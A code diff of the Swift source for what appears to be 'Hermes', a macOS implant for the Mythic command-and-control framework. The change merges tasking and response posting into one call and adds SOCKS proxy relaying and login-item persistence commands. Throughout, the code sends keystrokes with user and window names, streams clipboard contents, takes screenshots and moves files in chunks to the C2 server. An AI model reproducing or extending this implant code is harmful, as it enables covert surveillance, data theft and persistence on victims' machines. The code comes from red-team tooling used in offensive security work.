@@ -86,24 +86,309 @@ var tccDownloads = false
 var tccDocuments = false
 var tccDesktop = false
 
+let socksMsgList = SocksMsgList.init()
+
 class JobList {
     var jobCount = 0
     var jobs = [Job]()
 }
 
-func getTasking(jobList: JobList) throws {
+func getTaskingAndPostResponse(jobList: JobList) throws {
     // Create JSON payload
+    var jsonJobOutput = [JSON]()
+    
+    // Loop through all jobs and filter for completed
+    for job in jobList.jobs {
+        // Normal completed jobs
+        if job.completed {
+            let jsonResponse = JSON([
+                "task_id": job.taskID,
+                "user_output": job.result,
+                "completed": job.success,
+                "status": job.status,
+                "processes": job.processes,
+                "file_browser": job.fileBrowser,
+                "removed_files": job.removedFiles,
+            ])
+            jsonJobOutput.append(jsonResponse)
+        }
+        
+        // Handle jxa_import jobs
+        if job.command == "jxa_import" {
+            // Increase chunk number, starts at 0
+            job.uploadChunkNumber += 1
+            // Get first chunk or remaining chunks
+            if ((job.uploadChunkNumber == 1) || (job.uploadChunkNumber <= job.uploadTotalChunks)) {
+                let jsonUpload = JSON([
+                    "chunk_size": 512000,
+                    "file_id": job.uploadFileID,
+                    "chunk_num": job.uploadChunkNumber,
+                ])
+                
+                let jsonResponse = JSON([
+                    "upload": jsonUpload,
+                    "user_output": job.result,
+                    "completed": job.success,
+                    "status": job.status,
+                    "task_id": job.taskID,
+                ])
+                jsonJobOutput.append(jsonResponse)
+            }
+        }
+        
+        // Handle upload jobs
+        if job.command == "upload" {
+
+            job.uploadChunkNumber += 1
+
+            // Get first chunk or remaining chunks
+            if ((job.uploadChunkNumber == 1) || (job.uploadChunkNumber <= job.uploadTotalChunks)) {
+                let jsonUpload = JSON([
+                    "chunk_size": 512000,
+                    "file_id": job.uploadFileID,
+                    "chunk_num": job.uploadChunkNumber,
+                    "full_path": job.uploadFullPath,
+                ])
+                
+                let jsonResponse = JSON([
+                    "upload": jsonUpload,
+                    "user_output": job.result,
+                    "completed": job.success,
+                    "status": job.status,
+                    "task_id": job.taskID,
+                ])
+                // Increase chunk number, starts at 0
+                jsonJobOutput.append(jsonResponse)
+            }
+        }
+        
+        // Handle download jobs
+        if job.command == "download" {
+            // We don't have a file_id yet, request one from Mythic
+            if ((job.downloadFileID == "") && (job.downloadTotalChunks > 0)) {
+                let jsonResponse = JSON([
+                    "task_id": job.taskID,
+                    "download": [
+                    "total_chunks": job.downloadTotalChunks,
+                    "full_path": job.downloadFullPath,
+                    "host": job.downloadHost,
+                    "is_screenshot": job.downloadIsScreenshot
+                    ]
+                ])
+                jsonJobOutput.append(jsonResponse)
+            }
+            // Send file chunk
+            else if((job.downloadFileID != "") && (job.downloadTotalChunks > 0)) && (job.downloadChunkData != "") {
+                let jsonResponse = JSON([
+                    "task_id": job.taskID,
+                    "download": [
+                    "chunk_num": job.downloadChunkNumber,
+                    "file_id": job.downloadFileID,
+                    "chunk_data": job.downloadChunkData,
+                    "user_output": job.result
+                    ]
+                ])
+                jsonJobOutput.append(jsonResponse)
+                job.downloadChunkNumber = job.downloadChunkNumber + 1
+            }
+        }
+        
+        // Handle screenshot jobs
+        if job.command == "screenshot" {
+            // We don't have a file_id yet, request one from Mythic
+            if ((job.downloadFileID == "") && (job.downloadTotalChunks > 0)) {
+                let jsonResponse = JSON([
+                    "task_id": job.taskID,
+                    "download": [
+                        "total_chunks": job.downloadTotalChunks,
+                        "full_path": job.downloadFullPath,
+                        "host": job.downloadHost,
+                        "is_screenshot": job.downloadIsScreenshot
+                    ]
+                ])
+                jsonJobOutput.append(jsonResponse)
+            }
+            // Send file chunk
+            else if((job.downloadFileID != "") && (job.downloadTotalChunks > 0)) && (job.downloadChunkData != "") {
+                let jsonResponse = JSON([
+                    "chunk_num": job.downloadChunkNumber,
+                    "file_id": job.downloadFileID,
+                    "chunk_data": job.downloadChunkData,
+                    "task_id": job.taskID,
+                    "user_output": job.result,
+                ])
+                jsonJobOutput.append(jsonResponse)
+                job.downloadChunkNumber = job.downloadChunkNumber + 1
+            }
+        }
+        
+        // Handle keylog jobs
+        if job.command == "keylog" {
+            job.keylogBuffer += keylogBuffer
+            keylogBuffer = ""
+            let jsonResponse = JSON([
+                "task_id": job.taskID,
+                "user": NSUserName(),
+                "window_title": NSWorkspace.shared.frontmostApplication?.localizedName,
+                "keystrokes": job.keylogBuffer,
+            ])
+            job.keylogBuffer = ""
+            jsonJobOutput.append(jsonResponse)
+        }
+        
+        // Continuously stream clipboard data
+        if job.command == "clipboard" {
+            let jsonResponse = JSON([
+                "task_id": job.taskID,
+                "user_output": job.result,
+            ])
+            job.result = ""
+            jsonJobOutput.append(jsonResponse)
+        }
+    }
+    var jsonSocksOutput = [JSON]()
+    
+    //Parse socks responses
+    while !socksResponsesList.isEmpty {
+        let socksResponse = socksResponsesList.removeFirst()
+        let jsonSocks = JSON([
+            "server_id": socksResponse.server_id,
+            "exit": socksResponse.exit,
+            "port": socksResponse.port,
+            "data": socksResponse.data
+        ])
+       //print(socksResponse)
+        //print(jsonSocks)
+        jsonSocksOutput.append(jsonSocks)
+    }
+    //print(connectionMap.count)
+    
     let jsonPayload = JSON([
         "action": "get_tasking",
         "tasking_size": -1,
+        "responses": jsonJobOutput,
+        "socks": jsonSocksOutput
     ])
     
     // Decode negotiated b64 session key from agent config
     let sessionKey = fromBase64(data: agentConfig.encodedAESKey)
     
     // Send Hermes message, get Mythic response, decrypt and decode
-    let jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey, httpMethod: "get")
-    print("GET_TASKING", jsonResponse)
+    let jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey, httpMethod: "post")
+    //print("GET_TASKING", jsonResponse)
+    
+
+    // Added socks info
+    let jsonSocks = jsonResponse["socks"]
+    for(_, socksMsgs):(String, JSON) in jsonSocks {
+        let socksMsg = SocksMsg.init()
+        socksMsg.data = socksMsgs["data"].stringValue
+        socksMsg.port = socksMsgs["port"].intValue
+        socksMsg.server_id = socksMsgs["server_id"].intValue
+        socksMsg.exit = socksMsgs["exit"].boolValue
+        
+        socksMsgList.SocksMsgList.addItem(socksMsg)
+        //print(socksMsgs)
+    }
+    
+    let jsonResponses = jsonResponse["responses"]
+    // Process Mythic response
+    for(_, responses):(String, JSON) in jsonResponses {
+        // Find success message from Mythic
+        if responses["status"].stringValue == "success" {
+            // Loop through Hermes jobs
+            for (index, job) in jobList.jobs.enumerated() {
+                // Found a job that succeeded and matched with task_id
+                if responses["task_id"].stringValue == job.taskID {
+                    // Delete job if it is a "normal" job
+                    if ((job.command != "download") && (job.command != "upload") && (job.command != "screenshot") && (job.command != "keylog") && (job.command != "clipboard") && (job.command != "exit") && (job.command != "jxa_import")) {
+                        jobList.jobs.remove(at: index)
+                        //print("job removed")
+                    }
+                    // Handle jxa_import responses
+                    else if job.command == "jxa_import" {
+                        // Save total chunks + chunk_data from first upload message
+                        if ((job.uploadTotalChunks == 0) && (responses["total_chunks"].exists())) {
+                            job.uploadTotalChunks = responses["total_chunks"].intValue
+                            job.uploadData = responses["chunk_data"].stringValue
+                        }
+                        // parse remaining upload messages
+                        else if job.uploadChunkNumber <= job.uploadTotalChunks {
+                            job.uploadData = responses["chunk_data"].stringValue
+                        }
+                        // Delete job if upload task is complete
+                        else if job.uploadChunkNumber > job.uploadTotalChunks {
+                            //job.uploadData += responses["chunk_data"].stringValue
+                            jobList.jobs.remove(at: index)
+                        }
+                    }
+                    // Handle exit responses
+                    else if job.command == "exit" {
+                        exit(0)
+                    }
+                    // Handle screenshot responses
+                    else if job.command == "screenshot" {
+                        // Save file_id returned from Mythic for first download message
+                        if ((job.downloadFileID == "") && (responses["file_id"].exists())) {
+                            job.downloadFileID = responses["file_id"].stringValue
+                        }
+                        // Delete job if download task is complete
+                        else if job.screenshotDisplayNumber >= job.screenshotTotalDisplays {
+                            jobList.jobs.remove(at: index)
+                        }
+                        // Once download is complete, reset job variables for multiple displays
+                        else if (job.downloadChunkNumber > job.downloadTotalChunks) && (job.screenshotDisplayNumber < job.screenshotTotalDisplays) {
+                            job.screenshotDisplayNumber += 1
+                            job.downloadFileID = ""
+                            job.downloadChunkNumber = 0
+                            job.downloadTotalChunks = 0
+                            job.downloadFileSize = 0
+                            job.downloadChunkData = ""
+                        }
+                        // Error may have occurred when getting file_id from Mythic, remove the job
+                        else if job.downloadTotalChunks == 0 {
+                            jobList.jobs.remove(at: index)
+                        }
+                    }
+                    // Handle download responses
+                    else if job.command == "download" {
+                        // Save file_id returned from Mythic for first download message
+                        if ((job.downloadFileID == "") && (responses["file_id"].exists())) {
+                            job.downloadFileID = responses["file_id"].stringValue
+                            print("SAVING_FILEID", job.downloadFileID)
+                        }
+                        // Delete job if download task is complete
+                        else if job.downloadChunkNumber > job.downloadTotalChunks {
+                            jobList.jobs.remove(at: index)
+                            //print("download job removed")
+                        }
+                        // Error may have occurred when getting file_id from Mythic, remove the job
+                        else if job.downloadTotalChunks == 0 {
+                            jobList.jobs.remove(at: index)
+                        }
+                    }
+                    // Handle upload responses
+                    else if job.command == "upload" {
+                        // Save total chunks + chunk_data from first upload message
+                        if ((job.uploadTotalChunks == 0) && (responses["total_chunks"].exists())) {
+                            job.uploadTotalChunks = responses["total_chunks"].intValue
+                            job.uploadData = responses["chunk_data"].stringValue
+                        }
+                        // parse remaining upload messages
+                        else if job.uploadChunkNumber <= job.uploadTotalChunks {
+                            job.uploadData = responses["chunk_data"].stringValue
+                        }
+                        // Delete job if upload task is complete
+                        else if job.uploadChunkNumber > job.uploadTotalChunks {
+                            //job.uploadData += responses["chunk_data"].stringValue
+                            jobList.jobs.remove(at: index)
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
     let jsonTasks = jsonResponse["tasks"]
     
     // Loop through tasks
@@ -203,6 +488,13 @@ func executeTask(job: Job, jobList: JobList) {
         }
         // If job already has a file_id, download a chunk of the file
         else {
+            // For download_new browser script
+            let jsonUserOutput = JSON([
+                "agent_file_id": job.downloadFileID,
+                "total_chunks": job.downloadTotalChunks,
+            ])
+            job.result = jsonUserOutput.rawString() ?? ""
+            
             downloadChunk(job: job)
         }
     case "upload":
@@ -227,19 +519,25 @@ func executeTask(job: Job, jobList: JobList) {
             }
             // If job already has a file_id, download a chunk of the file
             else {
+                // For screencapture_new browser script
+                if (job.downloadChunkNumber == 1) {
+                    let jsonUserOutput = JSON([
+                        "file_id": job.downloadFileID,
+                        "total_chunks": job.downloadTotalChunks,
+                    ])
+                    job.result = jsonUserOutput.rawString() ?? ""
+                }
+                else {
+                    job.result = ""
+                }
                 downloadScreenshotChunk(job: job)
             }
         }
         // Successfully looped through all displays
         else {
-            let jsonResult = JSON([
-                "total_chunks": job.downloadTotalChunks,
-                "agent_file_id": job.downloadFileID,
-            ])
-            job.result = jsonResult.rawString()!
+            job.result = ""
             job.completed = true
             job.success = true
-            job.status = "success"
         }
     case "mkdir":
         makeDirectory(job: job)
@@ -287,6 +585,12 @@ func executeTask(job: Job, jobList: JobList) {
         tccFolderCheck(job: job)
     case "accessibility_check":
         accessibilityCheck(job: job)
+    case "login_item_add":
+        login_item_add(job: job)
+    case "login_item_remove":
+        login_item_remove(job: job)
+    case "socks":
+        socks(job: job)
     default:
         job.result = "Command not implemented."
         job.status = "error"
@@ -295,276 +599,3 @@ func executeTask(job: Job, jobList: JobList) {
     }
 }
 
-func postResponse(jobList: JobList) {
-    var jsonJobOutput = [JSON]()
-    
-    // Loop through all jobs and filter for completed
-    for job in jobList.jobs {
-        // Normal completed jobs
-        if job.completed {
-            let jsonResponse = JSON([
-                "task_id": job.taskID,
-                "user_output": job.result,
-                "completed": job.success,
-                "status": job.status,
-                "processes": job.processes,
-                "file_browser": job.fileBrowser,
-                "removed_files": job.removedFiles,
-            ])
-            jsonJobOutput.append(jsonResponse)
-        }
-        
-        // Handle jxa_import jobs
-        if job.command == "jxa_import" {
-            // Increase chunk number, starts at 0
-            job.uploadChunkNumber += 1
-            // Get first chunk or remaining chunks
-            if ((job.uploadChunkNumber == 1) || (job.uploadChunkNumber <= job.uploadTotalChunks)) {
-                let jsonUpload = JSON([
-                    "chunk_size": 512000,
-                    "file_id": job.uploadFileID,
-                    "chunk_num": job.uploadChunkNumber,
-                ])
-                
-                let jsonResponse = JSON([
-                    "upload": jsonUpload,
-                    "user_output": job.result,
-                    "completed": job.success,
-                    "status": job.status,
-                    "task_id": job.taskID,
-                ])
-                jsonJobOutput.append(jsonResponse)
-            }
-        }
-        
-        // Handle upload jobs
-        if job.command == "upload" {
-            // Increase chunk number, starts at 0
-            job.uploadChunkNumber += 1
-            // Get first chunk or remaining chunks
-            if ((job.uploadChunkNumber == 1) || (job.uploadChunkNumber <= job.uploadTotalChunks)) {
-                let jsonUpload = JSON([
-                    "chunk_size": 512000,
-                    "file_id": job.uploadFileID,
-                    "chunk_num": job.uploadChunkNumber,
-                    "full_path": job.uploadFullPath,
-                ])
-                
-                let jsonResponse = JSON([
-                    "upload": jsonUpload,
-                    "user_output": job.result,
-                    "completed": job.success,
-                    "status": job.status,
-                    "task_id": job.taskID,
-                ])
-                jsonJobOutput.append(jsonResponse)
-            }
-        }
-        
-        // Handle download jobs
-        if job.command == "download" {
-            // We don't have a file_id yet, request one from Mythic
-            if ((job.downloadFileID == "") && (job.downloadTotalChunks > 0)) {
-                let jsonResponse = JSON([
-                    "total_chunks": job.downloadTotalChunks,
-                    "full_path": job.downloadFullPath,
-                    "host": job.downloadHost,
-                    "is_screenshot": job.downloadIsScreenshot,
-                ])
-                let jsonPayload = JSON([
-                    "task_id": job.taskID,
-                    "status": job.status,
-                    "total_chunks": job.downloadTotalChunks,
-                    "download": jsonResponse,
-                ])
-                jsonJobOutput.append(jsonPayload)
-            }
-            // Send file chunk
-            else if((job.downloadFileID != "") && (job.downloadTotalChunks > 0)) && (job.downloadChunkData != "") {
-                let jsonResponse = JSON([
-                    "chunk_num": job.downloadChunkNumber,
-                    "file_id": job.downloadFileID,
-                    "chunk_data": job.downloadChunkData,
-                    "user_output": job.result,
-                ])
-                let jsonPayload = JSON([
-                    "task_id": job.taskID,
-                    "status": job.status,
-                    "total_chunks": job.downloadTotalChunks,
-                    "download": jsonResponse,
-                ])
-                jsonJobOutput.append(jsonPayload)
-                job.downloadChunkNumber = job.downloadChunkNumber + 1
-            }
-        }
-        
-        // Handle screenshot jobs
-        if job.command == "screenshot" {
-            // We don't have a file_id yet, request one from Mythic
-            if ((job.downloadFileID == "") && (job.downloadTotalChunks > 0)) {
-                let jsonResponse = JSON([
-                    "total_chunks": job.downloadTotalChunks,
-                    "full_path": job.downloadFullPath,
-                    "host": job.downloadHost,
-                    "is_screenshot": job.downloadIsScreenshot,
-                ])
-                let jsonPayload = JSON([
-                    "task_id": job.taskID,
-                    "status": job.status,
-                    "total_chunks": job.downloadTotalChunks,
-                    "download": jsonResponse,
-                ])
-                jsonJobOutput.append(jsonPayload)
-            }
-            // Send file chunk
-            else if((job.downloadFileID != "") && (job.downloadTotalChunks > 0)) && (job.downloadChunkData != "") {
-                let jsonResponse = JSON([
-                    "chunk_num": job.downloadChunkNumber,
-                    "file_id": job.downloadFileID,
-                    "chunk_data": job.downloadChunkData,
-                    "user_output": job.result,
-                ])
-                let jsonPayload = JSON([
-                    "task_id": job.taskID,
-                    "status": job.status,
-                    "total_chunks": job.downloadTotalChunks,
-                    "download": jsonResponse,
-                ])
-                jsonJobOutput.append(jsonPayload)
-                job.downloadChunkNumber = job.downloadChunkNumber + 1
-            }
-        }
-        
-        // Handle keylog jobs
-        if job.command == "keylog" {
-            job.keylogBuffer += keylogBuffer
-            keylogBuffer = ""
-            let jsonResponse = JSON([
-                "task_id": job.taskID,
-                "user": NSUserName(),
-                "window_title": NSWorkspace.shared.frontmostApplication?.localizedName,
-                "keystrokes": job.keylogBuffer,
-            ])
-            job.keylogBuffer = ""
-            jsonJobOutput.append(jsonResponse)
-        }
-        
-        // Continuously stream clipboard data
-        if job.command == "clipboard" {
-            let jsonResponse = JSON([
-                "task_id": job.taskID,
-                "user_output": job.result,
-            ])
-            job.result = ""
-            jsonJobOutput.append(jsonResponse)
-        }
-    }
-    
-    let jsonPayload = JSON([
-        "action": "post_response",
-        "responses": jsonJobOutput,
-    ])
-    print("HERMES_POST_RESPONSE", jsonPayload)
-    // Decode negotiated b64 session key from agent config
-    let sessionKey = fromBase64(data: agentConfig.encodedAESKey)
-    
-    // Send Hermes message, get Mythic response, decrypt and decode
-    let jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey, httpMethod: "post")
-    print("MYTHIC_POST_RESPONSE", jsonResponse)
-    let jsonResponses = jsonResponse["responses"]
-    
-    // Process Mythic response
-    for(_, responses):(String, JSON) in jsonResponses {
-        // Find success message from Mythic
-        if responses["status"].stringValue == "success" {
-            // Loop through Hermes jobs
-            for (index, job) in jobList.jobs.enumerated() {
-                // Found a job that succeeded and matched with task_id
-                if responses["task_id"].stringValue == job.taskID {
-                    // Delete job if it is a "normal" job
-                    if ((job.command != "download") && (job.command != "upload") && (job.command != "screenshot") && (job.command != "keylog") && (job.command != "clipboard") && (job.command != "exit") && (job.command != "jxa_import")) {
-                        jobList.jobs.remove(at: index)
-                        print("job removed")
-                    }
-                    // Handle jxa_import responses
-                    else if job.command == "jxa_import" {
-                        // Save total chunks + chunk_data from first upload message
-                        if ((job.uploadTotalChunks == 0) && (responses["total_chunks"].exists())) {
-                            job.uploadTotalChunks = responses["total_chunks"].intValue
-                            job.uploadData = responses["chunk_data"].stringValue
-                        }
-                        // parse remaining upload messages
-                        else if job.uploadChunkNumber <= job.uploadTotalChunks {
-                            job.uploadData = responses["chunk_data"].stringValue
-                        }
-                        // Delete job if upload task is complete
-                        else if job.uploadChunkNumber > job.uploadTotalChunks {
-                            //job.uploadData += responses["chunk_data"].stringValue
-                            jobList.jobs.remove(at: index)
-                        }
-                    }
-                    // Handle exit responses
-                    else if job.command == "exit" {
-                        exit(0)
-                    }
-                    // Handle screenshot responses
-                    else if job.command == "screenshot" {
-                        // Save file_id returned from Mythic for first download message
-                        if ((job.downloadFileID == "") && (responses["file_id"].exists())) {
-                            job.downloadFileID = responses["file_id"].stringValue
-                        }
-                        // Delete job if download task is complete
-                        else if job.screenshotDisplayNumber >= job.screenshotTotalDisplays {
-                            jobList.jobs.remove(at: index)
-                        }
-                        // Once download is complete, reset job variables for multiple displays
-                        else if (job.downloadChunkNumber > job.downloadTotalChunks) && (job.screenshotDisplayNumber < job.screenshotTotalDisplays) {
-                            job.screenshotDisplayNumber += 1
-                            //job.downloadFileID = ""
-                            job.downloadChunkNumber = 0
-                            job.downloadTotalChunks = 0
-                            job.downloadFileSize = 0
-                            job.downloadChunkData = ""
-                        }
-                        // Error may have occurred when getting file_id from Mythic, remove the job
-                        else if job.downloadTotalChunks == 0 {
-                            jobList.jobs.remove(at: index)
-                        }
-                    }
-                    // Handle download responses
-                    else if job.command == "download" {
-                        // Save file_id returned from Mythic for first download message
-                        if ((job.downloadFileID == "") && (responses["file_id"].exists())) {
-                            job.downloadFileID = responses["file_id"].stringValue
-                        }
-                        // Delete job if download task is complete
-                        else if job.downloadChunkNumber > job.downloadTotalChunks {
-                            jobList.jobs.remove(at: index)
-                        }
-                        // Error may have occurred when getting file_id from Mythic, remove the job
-                        else if job.downloadTotalChunks == 0 {
-                            jobList.jobs.remove(at: index)
-                        }
-                    }
-                    // Handle upload responses
-                    else if job.command == "upload" {
-                        // Save total chunks + chunk_data from first upload message
-                        if ((job.uploadTotalChunks == 0) && (responses["total_chunks"].exists())) {
-                            job.uploadTotalChunks = responses["total_chunks"].intValue
-                            job.uploadData = responses["chunk_data"].stringValue
-                        }
-                        // parse remaining upload messages
-                        else if job.uploadChunkNumber <= job.uploadTotalChunks {
-                            job.uploadData = responses["chunk_data"].stringValue
-                        }
-                        // Delete job if upload task is complete
-                        else if job.uploadChunkNumber > job.uploadTotalChunks {
-                            //job.uploadData += responses["chunk_data"].stringValue
-                            jobList.jobs.remove(at: index)
-                        }
-                    }
-                }
-            }
-        }
-    }
-}
